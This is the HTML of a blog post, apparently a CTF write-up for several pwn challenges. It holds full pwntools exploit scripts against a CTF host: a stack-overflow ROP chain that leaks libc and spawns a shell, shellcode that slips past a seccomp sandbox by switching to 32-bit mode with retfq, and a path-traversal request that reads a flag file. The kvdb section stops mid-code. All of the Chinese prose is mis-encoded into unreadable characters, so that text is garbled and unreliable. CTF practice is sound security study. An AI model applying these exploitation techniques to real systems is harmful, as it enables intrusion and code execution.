<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="![img](file:&#x2F;&#x2F;&#x2F;C:\Users\å¼ é¹\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R&#96;A.png)  pwn1ä¸€é“æœ‰ç‚¹ç‚¹éº»çƒ¦çš„scanfæ ˆæº¢å‡ºï¼Œç»™äº†ä¸¤æ¬¡ä»»æ„æ”¹å’Œä¸€æ¬¡74å­—èŠ‚çš„scanfè¾“å…¥æœºä¼šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„æ”¹æ”¹TLSå‚¨å­˜çš„canaryçš„å€¼ï¼Œä¸è¿‡åªæœ‰åœ¨çº¿ç¨‹ä¸­æ‰canaryçš„å‚¨å­˜ä½ç½®æ‰ç¦»æ ˆå¾ˆè¿‘ï¼Œå¯ä»¥">
<meta property="og:type" content="article">
<meta property="og:title" content="MninL-CTF-pwn">
<meta property="og:url" content="http://example.com/2022/05/11/MninL-CTF-pwn/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="![img](file:&#x2F;&#x2F;&#x2F;C:\Users\å¼ é¹\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R&#96;A.png)  pwn1ä¸€é“æœ‰ç‚¹ç‚¹éº»çƒ¦çš„scanfæ ˆæº¢å‡ºï¼Œç»™äº†ä¸¤æ¬¡ä»»æ„æ”¹å’Œä¸€æ¬¡74å­—èŠ‚çš„scanfè¾“å…¥æœºä¼šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„æ”¹æ”¹TLSå‚¨å­˜çš„canaryçš„å€¼ï¼Œä¸è¿‡åªæœ‰åœ¨çº¿ç¨‹ä¸­æ‰canaryçš„å‚¨å­˜ä½ç½®æ‰ç¦»æ ˆå¾ˆè¿‘ï¼Œå¯ä»¥">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/å¼ é¹/AppData/Roaming/Typora/typora-user-images/image-20220511133825521.png">
<meta property="og:image" content="c:/Users/å¼ é¹/AppData/Roaming/Typora/typora-user-images/image-20220511135849068.png">
<meta property="article:published_time" content="2022-05-11T11:19:42.000Z">
<meta property="article:modified_time" content="2022-05-11T11:20:13.880Z">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/å¼ é¹/AppData/Roaming/Typora/typora-user-images/image-20220511133825521.png">

<link rel="canonical" href="http://example.com/2022/05/11/MninL-CTF-pwn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>MninL-CTF-pwn | study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/MninL-CTF-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          MninL-CTF-pwn
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-11 19:19:42 / ä¿®æ”¹æ—¶é—´ï¼š19:20:13" itemprop="dateCreated datePublished" datetime="2022-05-11T19:19:42+08:00">2022-05-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>![img](file:///C:\Users\å¼ é¹\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R`A.png)</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511133825521.png" alt="image-20220511133825521"></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ä¸€é“æœ‰ç‚¹ç‚¹éº»çƒ¦çš„scanfæ ˆæº¢å‡ºï¼Œç»™äº†ä¸¤æ¬¡ä»»æ„æ”¹å’Œä¸€æ¬¡74å­—èŠ‚çš„scanfè¾“å…¥æœºä¼šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„æ”¹æ”¹TLSå‚¨å­˜çš„canaryçš„å€¼ï¼Œä¸è¿‡åªæœ‰åœ¨çº¿ç¨‹ä¸­æ‰canaryçš„å‚¨å­˜ä½ç½®æ‰ç¦»æ ˆå¾ˆè¿‘ï¼Œå¯ä»¥é€šè¿‡æ ˆæ”¹ï¼Œåœ¨è¿›ç¨‹ä¸­éƒ½æ˜¯å‚¨å­˜åœ¨fsæ®µï¼Œç¦»æ ˆéå¸¸è¿œå°±ä¸å¥½æ›´æ”¹äº†ï¼Œç„¶åé€šè¿‡scanfçš„æ ˆæº¢å‡ºæä¸ªoggå°±èƒ½getshelläº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_LIBRARY_PATH&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;&#125;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x40142E</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Add new god:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Name: &quot;</span>,content.ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Do you know who is the God of XDSEC? (*^_^*)&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    edit(<span class="number">272</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">10</span>,p64(<span class="number">0x401236</span>))</span><br><span class="line">    pop_rdi=<span class="number">0x00000000004015d3</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>-<span class="number">1</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0x401236</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x0000000000034580</span>)+p64(libc_base+<span class="number">0xe3b34</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-shellcode"><a href="#pwn2-shellcode" class="headerlink" title="pwn2 shellcode"></a>pwn2 shellcode</h2><p>ä¸€é“æœ‰æ²™ç®±çš„shellcodeé¢˜ç›®ï¼Œåˆšå¼€å§‹é¢˜ç›®å‡ºçš„æœ‰é—®é¢˜ï¼Œæ²™ç®±æ²¡æœ‰ç¦ç”¨0x40000000,æ‰€ä»¥å¯ä»¥<code>0x40000000+ç³»ç»Ÿè°ƒç”¨å·</code>ç»•è¿‡æ²™ç®±ï¼Œæœ¬åœ°æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸€ç›´ä¸æˆåŠŸï¼Œå’Œå‡ºé¢˜äººåé¦ˆåè¯´æ˜¯é¢˜ç›®å‡ºé”™äº†ï¼Œæœ€åbanäº†0x40000000,ä½†æ˜¯æ²¡æœ‰banæ¶æ„ï¼Œæ²™ç›’å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/xidian/pwn5$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x05 0x00 0x40000000  if (A &gt; 0x40000000) goto 0007</span><br><span class="line"> 0002: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0007</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0007</span><br><span class="line"> 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>æœ¬è´¨ä¸Šä»–å…è®¸<code>1 5 0 9</code>è¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨å·ï¼Œåœ¨32ä½ä¸‹è°ƒç”¨å·5å¯¹åº”<code>open</code>ï¼Œè¿™æ ·orwå°±å‡‘é½äº†ï¼Œå…ˆåœ¨64ä¸‹åˆ©ç”¨mmapç”³è¯·32ä½åœ°å€çš„åœ°æ®µç©ºé—´ï¼Œç„¶åä½¿ç”¨<code>retfq</code>è½¬åˆ°32ä½ï¼Œè°ƒç”¨openåè°ƒç”¨<code>retfq</code>è¿”å›64ä½ï¼Œæ³¨æ„32ä½æ²¡æœ‰retfqè¿™ä¸ªæŒ‡ä»¤æ‰€ä»¥å¡«çš„æ˜¯64ä½çš„ï¼Œè¿˜æœ‰ç¬¬äºŒä¸ªretfqåé¢å¿…é¡»å¾—è¿˜æœ‰æŒ‡ä»¤æ‰èƒ½æ‰§è¡ŒæˆåŠŸï¼Œä¸ç„¶å°±ä¼šå‡ºé”™ï¼Œæœ€ååœ¨64ä½ä¸‹è°ƒç”¨rwå¾—åˆ°flag</p>
<p>åŸºæœ¬ä¸Šæ˜¯markä½¬æä¾›çš„æ€è·¯ã€‚è†œè†œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10057</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+0x13C2)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rax, 9</span></span><br><span class="line"><span class="string">    mov rdi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rsi, 0x100</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rcx, 34</span></span><br><span class="line"><span class="string">    mov r8, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov r9, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rsi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov esp, 0x70707a70</span></span><br><span class="line"><span class="string">    mov rax, 0x23</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push 0x70707077</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ebx, 0x70707070</span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov edx, 0</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode3=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x70707170</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode4=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi ,3</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pay=asm(shellcode1,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    pay=<span class="string">&#x27;./flag\x00&#x27;</span>+asm(shellcode2,arch=<span class="string">&#x27;i386&#x27;</span>)+asm(shellcode3,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(shellcode4,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3-easy-http"><a href="#pwn3-easy-http" class="headerlink" title="pwn3 easy_http"></a>pwn3 easy_http</h2><p>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»ï¼Œå°±æ˜¯ç¦äº†/<code>home/minil/flag</code>ç›®å½•ï¼Œç»•è¿‡å°±è¡Œäº†ï¼Œæ¯”å¦‚<code>/home/../home/mimil/flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10021</span>)</span><br><span class="line">pay=<span class="string">&#x27;GET /home/minil/../minil/flag\r\n&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;User-Agent: MiniL\r\n\r\n&#x27;</span></span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4-kvdb"><a href="#pwn4-kvdb" class="headerlink" title="pwn4 kvdb"></a>pwn4 kvdb</h2><p>è¿™é“é¢˜çš„ä»£ç é‡æ˜¯æˆ‘åšè¿‡çš„é¢˜ä¸­æœ€å¤§çš„ï¼Œå½“æ—¶å®¡äº†ä¸€ä¼šå®åœ¨å®¡ä¸ä¸‹å»å°±æ”¾å¼ƒäº†ï¼Œåé¢å‡ºé¢˜äººé‰´äºéš¾åº¦å¤ªå¤§ç›´æ¥æ”¾äº†æºç ï¼Œæ‰åˆè·‘æ¥çœ‹è¿™é“é¢˜ï¼Œä¸€çœ‹æºç ï¼Œå¥½å®¶ä¼™åŠ èµ·æ¥ä¸€åƒå¤šè¡Œäº†ï¼Œå…‰å®¡æ˜ç™½ä»£ç å’Œæ‰¾è§æ¼æ´èŠ±äº†ä¸€ä¸ªæ™šä¸Šã€‚ğŸ¤¦â€â™€ï¸</p>
<h3 id="0x1-ç»“æ„ä½“åŠå…³ç³»"><a href="#0x1-ç»“æ„ä½“åŠå…³ç³»" class="headerlink" title="0x1 ç»“æ„ä½“åŠå…³ç³»"></a>0x1 ç»“æ„ä½“åŠå…³ç³»</h3><p>ç¨‹åºå®ç°çš„æ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆæœ¬çš„æ•°æ®åº“ï¼ŒæŠŠé‡Œé¢çš„ç»“æ„ä½“çš„å…³ç³»æŠ½è±¡å‡ºæ¥å°±æ˜¯å¦‚ä¸‹å›¾</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511135849068.png" alt="image-20220511135849068"></p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>data_t</code>ç»“æ„ä½“äº†,æœ¬è´¨ä¸Šä»–æœ‰ä¸¤ä¸ªæˆå‘˜ï¼Œä¸€ä¸ªæˆå‘˜æ˜¯<code>uint16 type</code>ï¼Œè®°å½•çš„æ˜¯è¿™ä¸ª<code>data_t</code>ç»“æ„ä½“æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œ0-&gt;empty,1-&gt;int,2-&gt;float,3-&gt;string,ç„¶åè¿˜æœ‰ä¸€ä¸ªunionå…±ç”¨é¢˜è®°å½•æˆå‘˜å…·ä½“çš„é‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 <span class="keyword">data_integer_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> <span class="keyword">data_float_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_string_t</span> &#123;</span></span><br><span class="line">    uint32 len;</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">&#125; <span class="keyword">data_string_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_array_t</span> &#123;</span></span><br><span class="line">    uint32 count;</span><br><span class="line">    <span class="keyword">data_t</span>** items;</span><br><span class="line">&#125; <span class="keyword">data_array_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    uint16 type;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">data_integer_t</span> integer;</span><br><span class="line">        <span class="keyword">data_float_t</span> _float;</span><br><span class="line">        <span class="keyword">data_string_t</span> str;</span><br><span class="line">        <span class="keyword">data_array_t</span> <span class="built_in">array</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">data_t</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç»“æ„ä½“æ˜¯0x18å¤§å°çš„ï¼Œæ‰€ä»¥ä¼šç”³è¯·0x10å¤§å°çš„å †ï¼Œç„¶åä¸‹ä¸€ä¸ªå †å¤´çš„å‰å…«ä¸ªå­—èŠ‚ä¹Ÿç»™è¿™ä¸ªå †ç”¨ã€‚</p>
<h3 id="0x2-å¤§è‡´é€»è¾‘"><a href="#0x2-å¤§è‡´é€»è¾‘" class="headerlink" title="0x2 å¤§è‡´é€»è¾‘"></a>0x2 å¤§è‡´é€»è¾‘</h3><p>ç¨‹åºæ˜¯åˆ©ç”¨socketå’Œç”¨æˆ·è¿›è¡Œäº¤äº’çš„ï¼Œç¨‹åºçš„å¯åŠ¨è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kvdb -p 9999 -m 32 -l /dev/null -t 10 -d</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ç¨‹åºå¯¹å‘½ä»¤è¡Œå‚æ•°çš„è§£æè¿‡ç¨‹,å…¶ä¸­<code>getopt</code>å‡½æ•°å°±æ˜¯æ¯æ¬¡å–ä¸€ä¸ªé€‰é¡¹ï¼Œç„¶åæŠŠé€‰é¡¹å¯¹åº”çš„å€¼å­˜åˆ°optargä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;p:m:t:l:hd&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">               socks_server_port = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">               max_requests = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span 